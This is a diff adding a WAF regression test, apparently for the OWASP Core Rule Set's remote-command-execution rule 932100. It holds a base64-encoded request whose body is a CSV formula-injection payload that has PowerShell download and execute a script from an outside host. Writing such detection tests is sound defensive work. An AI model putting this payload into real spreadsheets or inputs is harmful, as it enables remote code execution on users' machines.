@@ -51,3 +51,13 @@
           version: HTTP/1.0
         output:
           log_contains: id "932100"
+  - 
+    test_title: 932100-3
+    desc: CSV Injection Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
+    stages:
+    - 
+      stage:
+        input:
+          encoded_request: "UE9TVCAvaW5kZXguaHRtbCBIVFRQLzEuMQpIb3N0OiAxOTIuMTY4LjEuMjMKVXNlci1BZ2VudDogY3VybC83LjQzLjAKQWNjZXB0OiAqLyoKQ29udGVudC1MZW5ndGg6IDY0CkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbm5lY3Rpb246IGNsb3NlCgpkPTE7MjszOzQ7NVxuMTtAU1VNKDErMSkqY21kfCcgcG93ZXJzaGVsbCBJRVgod2dldCAwci5wZS9wKSdcIUEwOzM="
+        output:
+          log_contains: id "932100"                
